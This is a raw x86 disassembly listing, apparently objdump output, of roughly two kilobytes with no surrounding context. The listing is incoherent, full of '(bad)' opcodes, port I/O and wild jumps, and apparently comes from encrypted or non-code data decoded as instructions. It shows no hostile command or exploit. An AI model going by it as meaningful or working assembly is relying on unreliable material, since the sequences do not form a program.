  4257f4:	fiadd  WORD PTR [edx]
  4257f6:	jmp    eax
  4257f8:	sar    ebp,1
  4257fa:	(bad)  
  4257fe:	enter  0xfedc,0xf9
  425802:	out    dx,al
  425803:	(bad)  
  425804:	test   eax,0xe2dbb7d6
  425809:	loope  0x4257d0
  42580b:	int    0xcf
  42580d:	in     eax,dx
  42580e:	cld    
  42580f:	mov    edx,0xf400d2db
  425814:	xlat   BYTE PTR ds:[ebx]
  425815:	out    0xd3,al
  425817:	fsubr  st(5),st
  425819:	les    eax,FWORD PTR [edi]
  42581b:	fiadd  WORD PTR [edi]
  42581d:	cld    
  42581e:	iret   
  42581f:	enter  0xe2fb,0xd3
  425823:	lods   al,BYTE PTR ds:[esi]
  425824:	in     eax,dx
  425825:	mov    esp,0xe5d3b0ae
  42582a:	aam    0xf5
  42582c:	mov    ch,0xcb
  42582e:	cli    
  42582f:	not    esi
  425831:	shl    eax,cl
  425833:	clc    
  425834:	mov    eax,0x6be00be
  425839:	fadd   st,st(1)
  42583b:	add    eax,0xc9e9e3df
  425840:	in     eax,0x6
  425842:	mov    bl,0xe7
  425844:	jmp    0xcb2d4000
  425849:	hlt    
  42584a:	idiv   DWORD PTR [eax-0xf310c1c]
  425850:	retf   0xd8c8
  425853:	mov    esp,0xe2d605bc
  425858:	lock ret 0xc8fb
  42585c:	les    ecx,FWORD PTR [edi]
  42585e:	out    dx,al
  42585f:	jmp    0xf1033f50
  425864:	mov    cl,0xc0
  425866:	mov    ebp,0xe4eef6cb
  42586b:	jmp    0x42586c
  42586d:	enter  0x3c9,0xdd
  425871:	ret    
  425872:	in     eax,dx
  425873:	sti    
  425874:	xlat   BYTE PTR ds:[ebx]
  425875:	loopne 0x42584b
  425877:	in     eax,0xdd
  425879:	(bad)  
  42587c:	add    al,0xca
  42587e:	push   es
  42587f:	cli    
  425880:	jmp    0x42584c
  425882:	int    0xe9
  425884:	(bad)  
  425885:	mov    ebp,0xedeed2ed
  42588a:	mov    dl,0xfb
  42588c:	rol    esp,cl
  42588e:	mov    esi,0xf8fddafd
  425893:	int3   
  425894:	mov    ecx,0xe3f1edde
  425899:	(bad)  
  42589a:	mul    dl
  42589c:	(bad)  
  42589d:	sti    
  42589e:	push   cs
  42589f:	int3   
  4258a0:	(bad)  
  4258a1:	les    edi,FWORD PTR [edi-0x3d1d4333]
  4258a7:	loopne 0x42586c
  4258a9:	mov    cl,0xc4
  4258ab:	mov    edx,0xefddfbcf
  4258b0:	mov    esi,0xdebcf2fa
  4258b5:	shl    eax,0xdb
  4258b8:	in     al,0xe3
  4258ba:	rcl    ah,1
  4258bc:	add    esp,edi
  4258be:	jecxz  0x4258b9
  4258c0:	jmp    0x4258a4
  4258c2:	int3   
  4258c3:	in     eax,0xd6
  4258c5:	ror    edi,1
  4258c7:	iret   
  4258c8:	shr    BYTE PTR [esp+esi*4-0x644354c],1
  4258cf:	leave  
  4258d0:	fcomp  st(0)
  4258d2:	not    dl
  4258d4:	mov    eax,0xe5d9f0f4
  4258d9:	ffreep st(6)
  4258db:	or     edi,edi
  4258dd:	retf   0xfdec
  4258e0:	or     ecx,ecx
  4258e2:	scas   eax,DWORD PTR es:[edi]
  4258e3:	scas   eax,DWORD PTR es:[edi]
  4258e4:	out    0xd1,eax
  4258e6:	ret    0xadf2
  4258e9:	leave  
  4258ea:	cmc    
  4258eb:	jmp    0xd4b1:0xeac5c5f1
  4258f2:	aad    0xde
  4258f4:	idiv   ecx
  4258f6:	mov    ebx,0xe1ddf005
  4258fc:	in     al,0xce
  4258fe:	in     al,dx
  4258ff:	(bad)  
  425900:	jmp    0xcc24210c
  425905:	leave  
  425906:	loopne 0x4258fb
  425908:	mov    bh,0xc7
  42590a:	in     al,dx
  42590b:	mov    ah,0xe5
  42590d:	in     al,dx
  42590e:	fcmove st,st(0)
  425910:	jmp    0x4258fa
  425912:	(bad)  
  425914:	in     eax,dx
  425915:	(bad)  
  425917:	out    0x3,eax
  425919:	hlt    
  42591a:	cmc    
  42591b:	(bad)  
  42591c:	(bad)  
  42591e:	loop   0x425927
  425920:	(bad)  
  425922:	leave  
  425923:	retf   
  425924:	lock fmul st(3),st
  425927:	out    0xf5,eax
  425929:	aam    0xe5
  42592b:	icebp  
  42592c:	mov    ecx,0xb1c9fab4
  425931:	in     al,dx
  425932:	fdivr  st,st(5)
  425934:	(bad)  
  425935:	in     al,dx
  425936:	loope  0x4258f5
  425938:	fisttp WORD PTR [edx]
  42593a:	(bad)  
  42593c:	loop   0x42591c
  42593e:	or     al,BYTE PTR [ebx]
  425940:	fsubrp st(6),st
  425942:	out    dx,eax
  425943:	into   
  425944:	rol    al,0xc3
  425947:	out    0xe7,al
  425949:	icebp  
  42594a:	int3   
  42594b:	into   
  42594c:	retf   0xcbba
  42594f:	mov    eax,0xf4f9f7d7
  425954:	add    esp,ebp
  425956:	cld    
  425957:	cmc    
  425958:	ret    
  425959:	add    al,BYTE PTR [edi]
  42595b:	clc    
  42595c:	(bad)  
  42595e:	leave  
  42595f:	repz cld 
  425961:	enter  0xe3df,0xd6
  425965:	out    dx,eax
  425966:	out    dx,al
  425967:	loop   0x42592a
  425969:	mov    dh,0xb4
  42596b:	(bad)  
  42596d:	mov    edi,0xf9f8f2bb
  425972:	sar    edx,0xe6
  425975:	out    0xdd,al
  425977:	(bad)  
  425978:	fprem1 
  42597a:	out    0xcb,al
  42597c:	fadd   st(0),st
  42597e:	or     bh,ch
  425980:	fst    QWORD PTR [ecx]
  425982:	lods   eax,DWORD PTR ds:[esi]
  425983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425984:	in     al,0xe7
  425986:	out    dx,eax
  425987:	mov    ah,0xec
  425989:	enter  0xefc6,0xc7
  42598d:	(bad)  
  42598e:	int    0xf9
  425990:	in     eax,dx
  425991:	inc    ebx
  425993:	cld    
  425994:	loope  0x42594e
  425996:	rcr    al,0xda
  425999:	add    ch,dl
  42599b:	fadd   st(1),st
  42599d:	(bad)  
  4259a0:	std    
  4259a1:	add    al,0xee
  4259a3:	mov    esp,0xd4adb1c4
  4259a8:	repz mov cl,0xdb
  4259ab:	jmp    0xba2f335d
  4259b0:	rcl    dh,cl
  4259b2:	rcr    edi,cl
  4259b4:	(bad)  
  4259b5:	std    
  4259b6:	add    dh,cl
  4259b8:	jecxz  0x4259bf
  4259ba:	icebp  
  4259bb:	(bad)  
  4259bc:	dec    BYTE PTR [edi]
  4259be:	int    0xca
  4259c0:	or     dh,ah
  4259c2:	mov    bl,0xcd
  4259c4:	int    0xb6
  4259c6:	ret    
  4259c7:	jecxz  0x42598d
  4259c9:	mov    bh,0xda
  4259cb:	mov    al,0xcd
  4259cd:	sti    
  4259ce:	out    dx,al
  4259cf:	mov    ah,0xed
  4259d1:	cld    
  4259d2:	div    DWORD PTR [esi-0x1b33313e]
  4259d8:	jmp    0x30d:0xd50a0bc0
  4259df:	jmp    eax
  4259e1:	jecxz  0x4259a6
  4259e3:	in     eax,0xcc
  4259e5:	mov    esi,0xc1cedcc5
  4259ea:	repz sar cl,1
  4259ed:	leave  
  4259ee:	call   0xf54032d0
  4259f3:	mov    edi,0xe2d2e0f7
  4259f8:	or     bl,dl
  4259fa:	add    bh,al
  4259fc:	in     al,0xd5
  4259fe:	add    ah,ah
  425a00:	int3   
  425a01:	or     edi,eax
  425a03:	shl    esi,cl
  425a05:	mov    cl,0xc0
  425a07:	int3   
  425a08:	into   
  425a09:	(bad)  
  425a0a:	aad    0xd8
  425a0c:	icebp  
  425a0d:	shl    DWORD PTR [ebx-0xa433237],1
  425a13:	(bad)  
  425a15:	pop    es
  425a16:	xacquire lock inc DWORD PTR ds:0xe8df02dc
  425a1e:	hlt    
  425a1f:	in     eax,0x3
  425a21:	(bad)  
  425a22:	(bad)  [ebx+ecx*8-0xe0e540b]
  425a29:	shl    al,cl
  425a2b:	in     al,dx
  425a2c:	jmp    0xf0f6:0xd5fdcccc
  425a33:	aad    0x7
  425a35:	sti    
  425a36:	mov    esp,0xe6d0fbe1
  425a3b:	stc    
  425a3c:	fcmovnb st,st(5)
  425a3e:	(bad)  
  425a40:	(bad)  
  425a41:	retf   0xcfe8
  425a44:	into   
  425a45:	int    0xf5
  425a47:	call   0xda3633ff
  425a4c:	imul   esi
  425a4e:	mov    ah,0xd0
  425a50:	aam    0xd2
  425a52:	shr    ch,cl
  425a54:	std    
  425a55:	clc    
  425a56:	out    0xf4,eax
  425a58:	std    
  425a59:	rcl    ch,1
  425a5b:	dec    DWORD PTR [edx]
  425a5d:	in     eax,0xc8
  425a5f:	or     al,0xe7
  425a61:	pop    es
  425a62:	fldcw  WORD PTR [ebx+ecx*8-0x4e381a11]
  425a69:	mov    dl,0xf5
  425a6b:	mov    ecx,0xdcdfb4da
  425a70:	mov    esp,0xffd2bef4
  425a75:	mov    esi,0x5c6e5d3
  425a7a:	leave  
  425a7b:	jmp    0x5dd:0xe402c608
  425a82:	iret   
  425a83:	jmp    0xae0d4954
  425a88:	shl    BYTE PTR [edi-0x64a4513],0xeb
  425a8f:	rcl    dh,1
  425a91:	jmp    0xde10334f
  425a96:	add    eax,0xd6daf9c1
  425a9b:	retf   
  425a9c:	fcmovu st,st(4)
  425a9e:	fstp   st(7)
  425aa0:	out    0x8,eax
  425aa2:	stos   DWORD PTR es:[edi],eax
  425aa3:	(bad)  
  425aa5:	loope  0x425a98
  425aa7:	ret    
  425aa8:	call   0xcf392187
  425aad:	out    dx,eax
  425aae:	retf   0xd3d1
  425ab1:	call   0xc6fb2ea3
  425ab6:	shl    esp,0xdc
  425ab9:	std    
  425aba:	retf   0x508
  425abd:	(bad)  
  425abe:	add    eax,DWORD PTR ds:0xcfcdede0
  425ac4:	int    0xbe
  425ac6:	loope  0x425a75
  425ac8:	loope  0x425ac5
  425aca:	mov    bh,0xf4
  425acc:	(bad)  
  425acd:	lds    edi,FWORD PTR [ecx-0x4842034c]
  425ad3:	rcl    edx,cl
  425ad5:	mov    esi,0xdcdbdabb
  425ada:	aad    0x6
  425adc:	(bad)  
  425add:	fcmove st,st(5)
  425adf:	push   cs
  425ae0:	les    eax,FWORD PTR [edi]
  425ae2:	repz fdivr QWORD PTR [esi-0x52170b4e]
  425ae9:	mov    dl,0xd8
  425aeb:	call   0xf93244b6
  425af0:	(bad)  
  425af2:	rcl    esi,cl
  425af4:	fadd   DWORD PTR [edi]
  425af6:	(bad)  
  425af8:	ret    
  425af9:	add    al,ah
  425afb:	add    al,0x0
  425afd:	or     al,ah
  425aff:	enter  0x501,0xd0
  425b03:	leave  
  425b04:	mov    cl,0xe8
  425b06:	icebp  
  425b07:	shl    eax,1
  425b09:	mov    ah,0xf4
  425b0b:	retf   0xf6c7
  425b0e:	iret   
  425b0f:	aad    0xde
  425b11:	out    dx,al
  425b12:	repz add cl,dh
  425b15:	push   es
  425b16:	in     eax,dx
  425b17:	mov    esp,0xffc5b8d7
  425b1c:	mul    ah
  425b1e:	(bad)  
  425b1f:	fucomip st,st(7)
  425b21:	fsubp  st(3),st
  425b23:	jmp    0x425b1b
  425b25:	shr    al,0xce
  425b28:	mov    ebx,0xeee7d3c9
  425b2d:	in     eax,dx
  425b2e:	sar    eax,1
  425b30:	mov    edx,0xd7dabc02
  425b35:	push   es
  425b36:	int3   
  425b37:	rcr    esp,1
  425b39:	shr    bl,1
  425b3b:	idiv   esi
  425b3d:	push   es
  425b3e:	dec    BYTE PTR [edx]
  425b40:	adc    ch,dl
  425b42:	in     al,0xe8
  425b44:	xlat   BYTE PTR ds:[ebx]
  425b45:	jmp    0x425b03
  425b47:	lods   al,BYTE PTR ds:[esi]
  425b48:	icebp  
  425b49:	xlat   BYTE PTR ds:[ebx]
  425b4a:	rcl    cl,cl
  425b4c:	aad    0xee
  425b4e:	(bad)  
  425b50:	mov    cl,0x3
  425b52:	mov    ebp,0xe5d6e2ec
  425b57:	add    ebp,eax
  425b59:	rol    esp,1
  425b5b:	fisttp DWORD PTR [ecx]
  425b5d:	add    al,0xc6
  425b5f:	in     al,0xd3
  425b61:	fdivr  st(3),st
  425b63:	mov    dl,0xb2
  425b65:	retf   0xd0b2
  425b68:	div    BYTE PTR [esi-0x4824283a]
  425b6e:	cli    
  425b6f:	call   0xe2255831
  425b74:	mov    ch,0xde
  425b76:	div    bh
  425b78:	(bad)  
  425b79:	lock pop es
  425b7b:	fld    DWORD PTR [edx]
  425b7d:	prefetch (bad)
  425b7e:	or     eax,0xbd0ef2ee
  425b83:	ffree  st(4)
  425b85:	icebp  
  425b86:	mov    ch,0xac
  425b88:	out    dx,al
  425b89:	mov    ch,0xcd
  425b8b:	clc    
  425b8c:	in     eax,dx
  425b8d:	mov    esi,0xd7f7cdb9
  425b92:	(bad)  
  425b93:	enter  0x2d0,0x3
  425b97:	(bad)  
  425b99:	test   cl,0x7
  425b9c:	aad    0xfc
  425b9e:	cld    
  425b9f:	pop    es
  425ba0:	push   es
  425ba1:	repz (bad) 
  425ba4:	(bad)
  425ba7:	jmp    0x425b5c
  425ba9:	fcomi  st,st(5)
  425bab:	jmp    0x425b9e
  425bad:	idiv   bh
  425baf:	mov    ebx,0xe2fcc8e9
  425bb4:	sti    
  425bb5:	std    
  425bb6:	sar    edx,cl
  425bb8:	out    0xd8,al
  425bba:	push   es
  425bbb:	enter  0x9d8,0xfa
  425bbf:	dec    ch
  425bc1:	in     eax,dx
  425bc2:	mov    cl,0xd8
  425bc4:	repnz scas eax,DWORD PTR es:[edi]
  425bc6:	mov    ebp,0xafc7e6e3
  425bcb:	jmp    FWORD PTR [ebp-0x4335322b]
  425bd1:	(bad)  
  425bd2:	lock repnz rcl ebx,0xfa
  425bd7:	fadd   DWORD PTR [ebx+eiz*8]
  425bda:	out    0xc5,eax
  425bdc:	cli    
  425bdd:	loop   0x425ba9
  425bdf:	stc    
  425be0:	in     eax,dx
  425be1:	in     eax,dx
  425be2:	in     eax,0xf3
  425be4:	xlat   BYTE PTR ds:[ebx]
  425be5:	mov    cl,0xc6
  425be7:	mov    dh,0xf0
  425be9:	ret    0xbada
  425bec:	clc    
  425bed:	fidiv  WORD PTR [esi-0xa43463c]
  425bf3:	shl    cl,0x2
  425bf6:	rcl    eax,1
  425bf8:	cmc    
  425bf9:	retf   
  425bfa:	cld    
  425bfb:	add    edi,esp
  425bfd:	(bad)  
  425bfe:	clc    
  425bff:	in     eax,0xce
  425c01:	in     al,0xeb
  425c03:	(bad)
  425c06:	imul   esi
  425c08:	lods   eax,DWORD PTR ds:[esi]
  425c09:	mov    cl,0xb5
  425c0b:	(bad)  
  425c0d:	push   DWORD PTR [ebx+0x3ecedd6]
  425c13:	sti    
  425c14:	mov    eax,0xe7febfdb
  425c19:	aam    0xea
  425c1b:	lsl    eax,sp
  425c1e:	jmp    0xce155b0b
  425c23:	ret    0xc7d7
  425c26:	repnz mov bl,0xee
  425c2a:	call   0xb4083c22
  425c2f:	jecxz  0x425c0c
  425c31:	cld    
  425c32:	loopne 0x425c0e
  425c34:	in     eax,dx
  425c35:	std    
  425c36:	(bad)  
  425c38:	(bad)
  425c3c:	xlat   BYTE PTR ds:[ebx]
  425c3d:	out    dx,eax
  425c3e:	fsub   st,st(5)
  425c40:	in     al,dx
  425c41:	jmp    0x425c0d
  425c43:	iret   
  425c44:	mov    dl,0xc4
  425c46:	mov    dh,0xc7
  425c48:	rcl    bh,0xcc
  425c4b:	int3   
  425c4c:	fstp   TBYTE PTR [ebx-0x1e152011]
  425c52:	in     al,dx
  425c53:	loop   0x425c4b
  425c55:	mov    esp,0xe6def8fb
  425c5a:	in     eax,0xfb
  425c5c:	(bad)  
  425c5d:	leave  
  425c5e:	stc    
  425c5f:	out    0xfe,eax
  425c61:	std    
  425c62:	scas   al,BYTE PTR es:[edi]
  425c63:	xlat   BYTE PTR ds:[ebx]
  425c64:	ret    
  425c65:	repnz rcl bl,0xdb
  425c69:	mov    cl,0xcd
  425c6b:	fnstenv [ebp-0x232c4233]
  425c71:	loope  0x425c6f
  425c73:	int    0xe7
  425c75:	mov    eax,0xd5b9d5e6
  425c7a:	mul    ebp
  425c7c:	mov    BYTE PTR [edi],0xfa
  425c7f:	stc    
  425c80:	lds    eax,FWORD PTR [ebx]
  425c82:	(bad)
  425c85:	(bad)  
  425c86:	leave  
  425c87:	shr    dl,1
  425c89:	cmc    
  425c8a:	mov    ah,0xeb
  425c8c:	cli    
  425c8d:	repz aam 0xd3
  425c90:	icebp  
  425c91:	div    DWORD PTR [edi+0x2f9c2df]
  425c97:	add    dh,ch
  425c99:	(bad)
  425c9c:	vpsubb xmm1,xmm2,XMMWORD PTR [ecx]
  425ca0:	repz out 0xf2,eax
  425ca3:	scas   eax,DWORD PTR es:[edi]
  425ca4:	rcl    esi,1
  425ca6:	retf   
  425ca7:	lock leave 
  425ca9:	mov    cl,0xaf
  425cab:	call   0xf3392c89
  425cb0:	lock rcl eax,cl
  425cb3:	mov    edx,0xdc07beb9
  425cb8:	mov    esp,0xcf00dc09
  425cbd:	inc    DWORD PTR [edx]
  425cbf:	retf   0xfe0f
  425cc2:	fldz   
  425cc4:	test   al,0xb6
  425cc6:	call   0xda2a5896
  425ccb:	in     eax,0xe7
  425ccd:	jmp    0xfec8:0xfddbebcd
  425cd4:	ret    
  425cd5:	hlt    
  425cd6:	fstp   TBYTE PTR [esi+0xac506e7]
  425cdc:	or     al,dh
  425cde:	out    dx,eax
  425cdf:	hlt    
  425ce0:	into   
  425ce1:	in     al,dx
  425ce2:	rcl    al,0xc6
  425ce5:	(bad)  
  425ce6:	in     eax,dx
  425ce7:	out    0xc4,al
  425ce9:	aad    0xcb
  425ceb:	(bad)  
  425cec:	clc    
  425ced:	in     al,dx
  425cee:	xlat   BYTE PTR ds:[ebx]
  425cef:	fsubr  st,st(3)
  425cf1:	aad    0xc3
  425cf3:	mov    edi,0xc507f5ed
  425cf8:	icebp  
  425cf9:	add    al,0xd4
  425cfb:	stc    
  425cfc:	rcr    esi,0xed
  425cff:	stc    
  425d00:	or     bh,ah
  425d02:	jmp    0xb60124f7
  425d07:	loopne 0x425d03
  425d09:	jmp    0xcadf:0xb9b1aed5
  425d10:	neg    ecx
  425d12:	jmp    0x10a2c12
  425d17:	jecxz  0x425cd6
  425d19:	rcl    esp,1
  425d1b:	pop    es
  425d1c:	push   cs
  425d1d:	iret   
  425d1e:	(bad)  
  425d1f:	call   0xb42d61ee
  425d24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d25:	jmp    0x425d1b
  425d27:	rol    ecx,1
  425d29:	retf   0xe8b1
  425d2c:	fcmovne st,st(4)
  425d2e:	rcl    ecx,cl
  425d30:	hlt    
  425d31:	fidivr WORD PTR [esi+0x2d7cedc]
  425d37:	sti    
  425d38:	fcomi  st,st(4)
  425d3a:	loopne 0x425d39
  425d3c:	fiadd  WORD PTR [edi+ecx*1]
  425d3f:	out    dx,al
  425d40:	cli    
  425d41:	clc    
  425d42:	test   al,0xc8
  425d44:	out    0xea,eax
  425d46:	aam    0xb6
  425d48:	repnz stc 
  425d4a:	enter  0xf7cf,0xf7
  425d4e:	shl    ebx,1
  425d50:	mov    ch,0xfb
  425d52:	(bad)  
  425d53:	hlt    
  425d54:	loope  0x425d53
  425d56:	in     eax,dx
  425d57:	jmp    0x425d3f
  425d59:	rcr    ebp,0xf9
  425d5c:	or     esp,edi
  425d5e:	retf   
  425d5f:	adc    ecx,ebp
  425d61:	out    dx,al
  425d62:	test   eax,0xebd7e3e9
  425d67:	mov    ah,0xed
  425d69:	in     eax,0xea
  425d6b:	xlat   BYTE PTR ds:[ebx]
  425d6c:	leave  
  425d6d:	(bad)  
  425d6e:	clc    
  425d6f:	int3   
  425d70:	(bad)  
  425d72:	add    bh,BYTE PTR [ecx-0x1a2f2121]
  425d78:	clc    
  425d79:	icebp  
  425d7a:	mov    edi,0xaf8e204
  425d7f:	add    al,0xc9
  425d81:	repnz (bad) 
  425d84:	(bad)  
  425d85:	lods   eax,DWORD PTR ds:[esi]
  425d86:	in     al,dx
  425d87:	in     al,0xb6
  425d89:	stc    
  425d8a:	test   ebx,0xbed9ebc6
  425d90:	enter  0xc9fc,0xb6
  425d94:	xlat   BYTE PTR ds:[ebx]
  425d95:	out    0xda,eax
  425d97:	(bad)  
  425d98:	xlat   BYTE PTR ds:[ebx]
  425d99:	jmp    0xdf45227c
  425d9e:	out    dx,al
  425d9f:	fucomp st(0)
  425da1:	in     eax,0xbe
  425da3:	loop   0x425d75
  425da5:	lods   al,BYTE PTR ds:[esi]
  425da6:	in     al,dx
  425da7:	int    0xef
  425da9:	ret    0xeae1
  425dac:	xlat   BYTE PTR ds:[ebx]
  425dad:	lds    esi,FWORD PTR [ebx-0x130a370b]
  425db3:	out    dx,eax
  425db4:	hlt    
  425db5:	hlt    
  425db6:	clc    
  425db7:	loope  0x425d90
  425db9:	xlat   BYTE PTR ds:[ebx]
  425dba:	or     al,BYTE PTR [eax]
  425dbc:	cli    
  425dbd:	mov    bh,0xc8
  425dc0:	loop   0x425dd5
  425dc2:	stos   BYTE PTR es:[edi],al
  425dc3:	retf   
  425dc4:	imul   ecx
  425dc6:	shl    cl,1
  425dc8:	sar    DWORD PTR [ebx-0x4521364f],0xdf
  425dcf:	in     eax,dx
  425dd0:	int    0xc2
  425dd2:	icebp  
  425dd3:	rcl    ch,cl
  425dd5:	fucom  st(1)
  425dd7:	xlat   BYTE PTR ds:[ebx]
  425dd8:	add    al,0xdb
  425dda:	shl    ah,1
  425ddc:	(bad)
  425ddf:	out    dx,eax
  425de0:	(bad)  
  425de2:	out    0xcf,eax
  425de4:	retf   0xace6
  425de7:	(bad)  
  425de8:	shl    DWORD PTR [edx-0x312f4518],cl
  425dee:	rcr    ebp,cl
  425df0:	loop   0x425ddc
  425df2:	fsub   st,st(1)
  425df4:	(bad)  
  425df5:	add    eax,0xeadedbcd
  425dfa:	aad    0xbe
  425dfc:	in     al,0xd9
  425dfe:	call   0xa93e65cf
  425e03:	lods   eax,DWORD PTR ds:[esi]
  425e04:	lods   eax,DWORD PTR ds:[esi]
  425e05:	shr    DWORD PTR [ebx+edi*8-0x11184d],0xc9
  425e0d:	std    
  425e0e:	xlat   BYTE PTR ds:[ebx]
  425e0f:	mov    dl,0xf2
  425e11:	in     eax,dx
  425e12:	icebp  
  425e13:	out    dx,al
  425e14:	sar    bl,cl
  425e16:	aad    0xfa
  425e18:	test   ebp,0xfa0e01fa
  425e1e:	jmp    0xf6a9:0xce07ecef
  425e25:	repnz mov ebp,0xf4fae4e8
  425e2b:	iret   
  425e2c:	dec    ch
  425e2e:	hlt    
  425e2f:	in     al,0xee
  425e31:	repz mul ebx
  425e34:	shl    ah,1
  425e36:	stc    
  425e37:	push   es
  425e38:	add    eax,0xe1d809dd
  425e3d:	(bad)  
  425e3e:	fucomi st,st(4)
  425e40:	add    eax,0xc6eae806
  425e45:	mov    ebp,0xe9f1b7e6
  425e4a:	out    dx,al
  425e4b:	neg    ecx
  425e4d:	mov    edx,0xd4cbdcb5
  425e52:	shr    edi,1
  425e54:	into   
  425e55:	add    eax,eax
  425e57:	cld    
  425e58:	jmp    0x425e51
  425e5a:	(bad)  
  425e5c:	out    dx,al
  425e5d:	add    eax,DWORD PTR [edi]
  425e5f:	push   cs
  425e60:	adc    al,BYTE PTR [esi]
  425e62:	rcl    bl,1
  425e64:	test   al,0xb0
  425e66:	out    0xc5,eax
  425e68:	lock fcmove st,st(0)
  425e6b:	fxch   st(0)
  425e6d:	xlat   BYTE PTR ds:[ebx]
  425e6e:	mov    ah,0xb5
  425e70:	add    ecx,esp
  425e72:	mov    esi,0xf2e2e000
  425e77:	add    DWORD PTR [eax],eax
  425e79:	ror    BYTE PTR [ebx],0xf7
  425e7c:	add    al,0xc9
  425e7e:	les    ecx,FWORD PTR [ecx]
  425e80:	adc    eax,DWORD PTR [eax]
  425e82:	mov    dl,0xc8
  425e84:	mov    ebp,0xe2f2bcf1
  425e89:	jmp    0xf7fb245f
  425e8e:	(bad)
  425e91:	cld    
  425e92:	rol    BYTE PTR [eax],1
  425e94:	(bad)  
  425e95:	(bad)  
  425e96:	in     eax,dx
  425e97:	lds    edi,FWORD PTR [ebp-0x35251527]
  425e9d:	loopne 0x425e63
  425e9f:	fsub   st,st(2)
  425ea1:	fcmovb st,st(6)
  425ea3:	jmp    0xe2d5:0xe2cfb7d3
  425eaa:	mov    bh,0xba
  425eac:	mov    eax,0xefecf2d4
  425eb1:	neg    esi
  425eb3:	(bad)  
  425eb4:	fild   DWORD PTR [edx]
  425eb6:	cld    
  425eb7:	fidivr DWORD PTR [edx+eax*1-0x34231422]
  425ebe:	jmp    0x425e98
  425ec0:	fmulp  st(5),st
  425ec2:	(bad)  
  425ec3:	leave  
  425ec4:	retf   0xe5cb
  425ec7:	repz out dx,eax
  425ec9:	in     eax,dx
  425eca:	mov    cl,0xc9
  425ecc:	in     al,dx
  425ecd:	mov    ecx,0xf3ebd5f6
  425ed2:	into   
  425ed3:	fadd   QWORD PTR [ebx]
  425ed5:	(bad)  
  425ed7:	std    
  425ed8:	cld    
  425ed9:	sar    bl,0xd8
  425edc:	cmc    
  425edd:	fadd   DWORD PTR [ebx]
  425edf:	jmp    0xdea8:0xb3edcc07
  425ee6:	mov    dh,0xe7
  425ee8:	icebp  
  425ee9:	mov    ah,0xe7
  425eeb:	repz push DWORD PTR [edi-0x112a2501]
  425ef2:	add    bl,dh
  425ef4:	icebp  
  425ef5:	rcl    dh,cl
  425ef7:	ftst   
  425ef9:	fadd   st,st(1)
  425efb:	or     ebp,esi
  425efd:	or     ah,bh
  425eff:	stc    
  425f00:	add    eax,0xc4c3b9d9
  425f05:	rol    ebp,cl
  425f07:	fdiv   QWORD PTR [edx-0x24174a07]
  425f0d:	fucomp st(3)
  425f0f:	call   0x4323904
  425f14:	shl    cl,0xfc
  425f17:	out    0xc1,eax
  425f19:	fcom   st(0)
  425f1b:	shr    ecx,0xc4
  425f1e:	in     eax,dx
  425f1f:	add    DWORD PTR ds:0xe0e7e5e8,ecx
  425f25:	icebp  
  425f26:	mov    cl,0xce
  425f28:	in     eax,0xd2
  425f2a:	(bad)  
  425f2b:	mov    ah,0xce
  425f2d:	fnsave [edi-0x3062009]
  425f33:	pop    es
  425f34:	mov    ebp,0xfed1e3e7
  425f39:	std    
  425f3a:	in     al,0xc8
  425f3c:	or     eax,DWORD PTR [ecx]
  425f3e:	(bad)  
  425f40:	in     eax,0x1
  425f42:	ret    
  425f43:	int    0xc6
  425f45:	ret    
  425f46:	cmc    
  425f47:	ret    0xccca
  425f4a:	repnz out dx,eax
  425f4c:	fxam   
  425f4e:	fmul   st,st(1)
  425f50:	jmp    0xf3f1:0xdff4c3f4
  425f57:	out    0xfc,eax
  425f59:	(bad)  
  425f5a:	(bad)  
  425f5c:	(bad)
  425f60:	in     eax,dx
  425f61:	int3   
  425f62:	jecxz  0x425f14
  425f64:	in     al,0xd5
  425f66:	mov    ch,0xdb
  425f68:	div    dl
  425f6a:	neg    eax
  425f6c:	mov    eax,0xf3f4f9fd
  425f71:	idiv   DWORD PTR [ebp-0x19403e3d]
  425f77:	lock out 0xdb,eax
  425f7a:	ret    0xf04
  425f7d:	in     eax,dx
  425f7e:	iret   
  425f7f:	add    DWORD PTR [ebx],edx
  425f81:	cli    
  425f82:	test   al,0xb0
  425f84:	into   
  425f85:	div    ebp
  425f87:	fucomi st,st(4)
  425f89:	mov    ch,0xf4
  425f8b:	fsqrt  
  425f8d:	mov    al,0xf3
  425f8f:	(bad)  
  425f90:	mov    ebp,0xc7d2ddfd
  425f95:	fadd   st,st(0)
  425f97:	loopne 0x425f8b
  425f99:	loopne 0x425f74
  425f9b:	fiadd  DWORD PTR [esi+edx*8]
  425f9e:	loop   0x425f7c
  425fa0:	call   0xe4224e8f
  425fa5:	iret   
  425fa6:	shr    edx,1
  425fa8:	int3   
  425fa9:	mov    bl,0xca
  425fab:	mov    edx,0xe4dafdb0
  425fb0:	jmp    0x425f9f
  425fb2:	shl    al,1
  425fb4:	in     al,dx
  425fb5:	mov    ebp,0xfddec504
  425fba:	(bad)  
  425fbb:	out    0x1,eax
  425fbd:	bswap  eax
  425fbf:	or     eax,0xf3e6ecdf
  425fc4:	(bad)  
  425fc5:	scas   al,BYTE PTR es:[edi]
  425fc6:	(bad)  
  425fc7:	(bad)  
  425fca:	aam    0xe8
  425fcc:	mov    eax,0xc8f9dcee
  425fd1:	int3   
  425fd2:	hlt    
  425fd3:	cld    
  425fd4:	pop    es
  425fd5:	add    dh,dl
  425fd7:	mov    esp,0xe0ca0705
  425fdc:	por    mm1,QWORD PTR [ebx]
  425fdf:	or     al,0xef
  425fe1:	push   cs
  425fe2:	mov    cl,0xcb
  425fe4:	xlat   BYTE PTR ds:[ebx]
  425fe5:	rep lods al,BYTE PTR ds:[esi]
  425fe7:	repz div al
  425fea:	out    dx,eax
  425feb:	retf   0xfbbb
  425fee:	out    dx,al
  425fef:	enter  0xb0f4,0xf2
  425ff3:	fcmovne st,st(5)
  425ff5:	fiadd  DWORD PTR [edx]
  425ff7:	rcl    bl,cl
  425ff9:	push   es
  425ffa:	add    al,0xe0
  425ffc:	loopne 0x425ffa
  425ffe:	push   es
  425fff:	or     dh,cl
  426001:	adc    DWORD PTR [ecx-0x4e432e41],edi
  426007:	lods   eax,DWORD PTR ds:[esi]
  426008:	loope  0x426003
  42600a:	enter  0xadef,0xd8
  42600e:	iret   
  42600f:	icebp  
  426010:	(bad)  
  426012:	(bad)  
  426014:	(bad)  
  426015:	aam    0xed
  426017:	cld    
  426018:	in     al,0xe4
  42601a:	(bad)  
  42601c:	call   0xa0f6f1b
  426021:	fldcw  WORD PTR [edi-0x4e08521c]
  426027:	test   ch,0xc7
  42602a:	iret   
